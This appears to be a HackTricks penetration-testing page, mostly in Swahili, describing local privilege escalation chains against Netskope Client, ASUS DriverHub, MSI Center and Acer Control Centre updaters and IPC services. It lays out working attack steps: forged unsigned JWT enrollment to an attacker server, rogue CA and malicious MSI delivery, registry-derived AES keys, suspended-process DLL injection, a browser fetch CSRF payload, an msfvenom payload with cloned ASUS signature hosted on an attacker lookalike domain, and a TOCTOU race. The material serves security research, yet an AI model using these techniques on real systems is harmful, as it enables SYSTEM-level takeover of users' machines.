# Kutumia vibaya Enterprise Auto-Updaters na Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unageneraliza daraja la Windows local privilege escalation chains zinazopatikana katika enterprise endpoint agents na updaters zinazofichua uso wa low\-friction IPC na mtiririko wa update wenye ruhusa. Mfano unaowakilisha ni Netskope Client for Windows < R129 (CVE-2025-0309), ambapo mtumiaji mwenye low\-privileged anaweza kulazimishwa kujiunga (enrollment) kwenye attacker\-controlled server kisha kuwasilisha MSI ya uharifu ambayo service ya SYSTEM inaisakinisha.

Mafikra muhimu unayoweza kutumia dhidi ya bidhaa zinazofanana:
- Tumia vibaya localhost IPC ya service yenye ruhusa ili kulazimisha re\-enrollment au reconfiguration kwa attacker server.
- Tekeleza endpoints za update za vendor, wasilisha rogue Trusted Root CA, na elekeza updater kwenye package yenye madhara, “signed”.
- Epuka ukaguzi dhaifu wa signer (CN allow\-lists), optional digest flags, na mali za MSI zisizo kali.
- Ikiwa IPC ime “encrypted”, dherisha key/IV kutoka kwa world\-readable machine identifiers zilizo kwenye registry.
- Ikiwa service inazuia wito kwa image path/process name, inject ndani ya process iliyoko kwenye allow\-list au anzisha moja suspended na bootstrap DLL yako kupitia patch ndogo ya thread\-context.

---
## 1) Kulazimisha enrollment kwa attacker server kupitia localhost IPC

Wakala wengi hufikisha process ya user\-mode UI inayoongea na service ya SYSTEM kupitia localhost TCP kwa kutumia JSON.

Imeonekana katika Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Tunga token ya JWT ya enrollment ambayo claims zake zinadhibiti backend host (mf., AddonUrl). Tumia alg=None ili hakuna signature itakayohitajika.
2) Tuma ujumbe wa IPC unaoitisha provisioning command ukiambatanisha JWT yako na tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Huduma inaanza kufikia server yako haramu kwa ajili ya enrollment/config, kwa mfano:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Ikiwa uthibitisho wa mtumaji ni path/name\-based, anzisha ombi hilo kutoka kwa binary ya muuzaji iliyoorodheshwa (angalia §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Mara mteja anapozungumza na seva yako, tekeleza endpoints zinazotarajiwa na uielekeze kwa MSI ya mshambuliaji. Mfululizo wa kawaida:

1) /v2/config/org/clientconfig → Rejesha JSON config yenye muda mfupi sana wa updater, kwa mfano:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Rudisha PEM CA certificate. The service inaisakinisha hiyo katika Local Machine Trusted Root store.
3) /v2/checkupdate → Toa metadata inayorejelea MSI ya hatari na version bandia.

Bypassing common checks seen in the wild:
- Signer CN allow\-list: service inaweza kuangalia tu kwamba Subject CN ni “netSkope Inc” au “Netskope, Inc.”. Rogue CA yako inaweza kutoa leaf yenye CN hiyo na kusaini MSI.
- CERT_DIGEST property: jumuisha property ya MSI isiyo hatari inayoitwa CERT_DIGEST. Hakuna enforcement wakati wa install.
- Optional digest enforcement: config flag (mfano, check_msi_digest=false) inapunguza uthibitishaji wa ziada wa cryptographic.

Matokeo: service ya SYSTEM inasakinisha MSI yako kutoka
C:\ProgramData\Netskope\stAgent\data\*.msi
ikitekeleza code yoyote kama NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Kutoka R127, Netskope ilifunga JSON ya IPC ndani ya encryptData field inayofanana na Base64. Reversing ilionyesha AES kwa key/IV zilizoonekana kutoka kwa values za registry zinazosomeka na mtumiaji yeyote:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Wavamizi wanaweza kuzalisha encryption na kutuma amri zilizoencrypted halali kutoka kwa mtumiaji wa kawaida. Vidokezo vya jumla: ikiwa agent ghafla “encrypts” IPC yake, tafuta device IDs, product GUIDs, install IDs chini ya HKLM kama vifaa vya kuunda key/IV.

---
## 4) Bypassing IPC caller allow\-lists (path/name checks)

Huduma zingine zinajaribu ku-authenticate peer kwa kutatua PID ya connection ya TCP na kulinganisha image path/name dhidi ya vendor binaries zilizopo kwenye Program Files (mfano, stagentui.exe, bwansvc.exe, epdlp.exe).

Njia mbili za vitendo:
- DLL injection ndani ya process iliyoko kwenye allow\-list (mfano, nsdiag.exe) na ku-proxy IPC kutoka ndani yake.
- Spawn binary iliyoko kwenye allow\-list katika hali suspended na bootstrap proxy DLL yako bila CreateRemoteThread (ona §5) ili kukidhi sheria za tamper zinazotekelezwa na driver.

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

Bidhaa mara nyingi huja na minifilter/OB callbacks driver (mfano, Stadrv) ili kuondoa rights hatarishi kutoka kwa handles kuelekea protected processes:
- Process: huondoa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: inapunguza hadi THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Loader thabiti ya user\-mode inayoheshimu vizingiti hivi:
1) CreateProcess ya vendor binary kwa kutumia CREATE_SUSPENDED.
2) Pata handles ambazo bado umepewa ruhusa: PROCESS_VM_WRITE | PROCESS_VM_OPERATION kwa process, na thread handle yenye THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (au tu THREAD_RESUME ikiwa unapatch code kwenye RIP inayojulikana).
3) Andika juu ya ntdll!NtContinue (au thunk nyingine ya mapema, iliyo-garantiwa-mapped) na stub ndogo inayoitisha LoadLibraryW kwa path ya DLL yako, kisha inaruka kurudi.
4) ResumeThread ili kuamsha stub yako in\-process, ikipakia DLL yako.

Kwa sababu hukutumia PROCESS_CREATE_THREAD au PROCESS_SUSPEND_RESUME juu ya process iliyokuwa tayari protected (uliiunda mwenyewe), sera ya driver inatimiza.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) inautomate rogue CA, kusaini MSI ya hatari, na kutumikia endpoints zinazohitajika: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope ni custom IPC client inayotengeneza arbitrary (hiari AES\-encrypted) IPC messages na inajumuisha suspended\-process injection ili itoke kutoka binary iliyopo kwenye allow\-list.

---
## 1) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ina user\-mode HTTP service (ADU.exe) kwenye 127.0.0.1:53000 inayotarajia simu za browser zikitoka https://driverhub.asus.com. Origin filter inafanya tu `string_contains(".asus.com")` juu ya Origin header na juu ya download URLs zinazoonyeshwa na `/asus/v1.0/*`. Host yoyote inayodhibitiwa na attacker kama `https://driverhub.asus.com.attacker.tld` kwa hivyo inapita ukaguzi na inaweza kutuma maombi yanayobadilisha state kutoka JavaScript. Angalia [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) kwa mifano zaidi ya bypass.

Mtiririko wa vitendo:
1) Sajili domain inayojumuisha `.asus.com` na iweke webpage hatari huko.
2) Tumia `fetch` au XHR kupiga endpoint yenye ruhusa (mfano, `Reboot`, `UpdateApp`) kwenye `http://127.0.0.1:53000`.
3) Tuma JSON body inayotarajiwa na handler – frontend JS iliyopakiwa inaonyesha schema hapa chini.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Hata PowerShell CLI iliyoonyeshwa hapa chini inafanikiwa wakati Origin header imespoofed kwa thamani ya kuaminika:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1\-click (or 0\-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code\-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring\-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker\-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
Marejeo
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)

{{#include ../../banners/hacktricks-training.md}}
